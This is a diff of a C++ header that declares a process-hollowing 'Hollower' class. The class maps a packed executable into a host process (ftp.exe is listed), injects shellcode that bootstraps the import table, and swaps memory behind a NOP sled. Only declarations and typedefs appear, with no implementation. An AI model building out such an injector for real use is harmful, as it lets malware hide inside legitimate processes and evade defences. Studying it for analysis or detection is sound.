@@ -3,22 +3,13 @@
 #include <string>
 #include <vector>
 #include "PEData.h"
+#include <unordered_set>
 #include "StringCryptor.h"
 
-#define SECTION_BASE_PLACEHOLDER 0xdeadbeef
-#define IAT_LOCATION_PLACEHOLDER 0xbeefdead
-#define CONTAINS_STRING_PLACEHOLDER 0xfeeddead
-#define KERNEL32_PLACEHOLDER 0xdeadc0de
-#define LOADLIBRARY_PLACEHOLDER 0xc0dedead
-#define GETPROCADDRESS_PLACEHOLDER 0xc0deface
-#define OEP_PLACEHOLDER 0xc0defade
-#define PUSH 0x68
-#define NOP 0x90
-#define JMP 0xE9
-#define PUSH_PLACEHOLDER 0xfec0de00
-
-#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
+#define EXE_RSRC_OFFSET 0x200
+/*********************************NT Routines - BEGIN***************************/
 typedef LONG NTSTATUS;
+#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 
 typedef struct _LSA_UNICODE_STRING {
 	USHORT Length;
@@ -34,8 +25,6 @@ typedef struct _OBJECT_ATTRIBUTES {
 	PVOID           SecurityDescriptor;
 	PVOID           SecurityQualityOfService;
 }  OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
-
-/*********************************NT Routines - BEGIN********************************************/
 
 typedef NTSTATUS(WINAPI *TNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
 
@@ -73,33 +62,33 @@ typedef NTSTATUS (WINAPI *TNtQueryInformationProcess)(
 class Hollower
 {
 public:
-	Hollower(std::wstring targetProcPath, IMAGE_DOS_HEADER *unpackedExe);
+	Hollower(std::wstring targetProcPath, BYTE* unpackedExe);
 	HANDLE DoHollow();
 	~Hollower();
-	void UnmapAtAddress(HANDLE proc, void* addr);
-	bool MapAtAddress(HANDLE proc, HANDLE hSection, void* &remoteAddr);
-	HANDLE hRemoteProc;
-	HANDLE hNopSection;
-	void* remoteCodeBase = NULL;
 
 private:
-	void SprayLoopTrap();
-	int IATBootstrapEP;
-	HANDLE CreateSectionBuffer(void* &base, SIZE_T size);
-	void WriteSections();
-	PEData *packedPEData,*hollowedPEData;
-	void *imageOffset;
+	std::unordered_set<std::wstring> supportedRISCYHollowers = { L"C:\\Windows\\SysWOW64\\ftp.exe" };
+	void* IATBootstrapLocalEP; /* address of local memory location of Bootstraping shellcode */
+	void* IATBootstrapRemoteEP; /* address of remote memory location of Bootstraping shellcode */
+	void* remoteNopBase; /* address of remote memory segment that was replaced with NOP sled */
+	void *imageOffset; /*Injected Image shares same memory segment as shellcode, this defines 
+					     the image offset within this segment*/
+	bool riscySupportedProcess;
 	void* localCodeSectionBase = NULL;
 	void* localNopSectionBase = NULL;
-	void WriteIATInfo(size_t IATInfoOffset);
-	void FixRelocations();
-	void SwapMemory();
-	void* remoteNopBase;
-	static DWORD WINAPI MemHotswap(LPVOID lparam);
+	void* remoteCodeBase = NULL;
+	void WriteSections(); //Writes exe sections to remote proc
+	PEData *packedPEData,*hollowedPEData;
+	void InjectBootstrapper(size_t IATInfoOffset); /* Loads, fixes-up, and writes bootstrapper shellcode */
+	void FixRelocations(); /* fixes exe relocations to match remote proc's address base */
+	void* GetRemoteImageBase();
 	size_t containsStringSize=0;
 	size_t IATshellcodeSize=0;
+	size_t SerializeIATInfo(); /*Write all import info to memory that the shellcode bootstrapper can use*/
 	std::wstring hollowedProcPath;
 	HANDLE hRemoteThread;
+	HANDLE hRemoteProc;
+	HANDLE hNopSection;
 	TNtUnmapViewOfSection NtUnmapViewOfSection;
 	TNtMapViewOfSection NtMapViewOfSection;
 	TNtCreateSection NtCreateSection;
@@ -107,15 +96,16 @@ private:
 	std::vector<PEData *> sections;
 
 	/*************HOLLOW ROUTINES***************/
+	static DWORD WINAPI MemHotswap(LPVOID lparam); /*thread (should be CRITICAL) that unmaps/maps remote image base
+												   goal is to run this thread before remote proc thread's schedule*/
+	void UnmapAtAddress(HANDLE proc, void* addr);
+	bool MapAtAddress(HANDLE proc, HANDLE hSection, void* &remoteAddr);
 	void MapBlankMemory();
-	size_t SerializeIATInfo();
-	void InjectBootstrapCode(size_t offset);
-	void StartRemoteProcess();
+	HANDLE CreateSectionBuffer(void* &base, SIZE_T size);
+	void SwapMemory();
+	bool StartRemoteProcess();
 
 };
-
-
-
 
 typedef struct _PEB_LDR_DATA {
 	BYTE Reserved1[8];
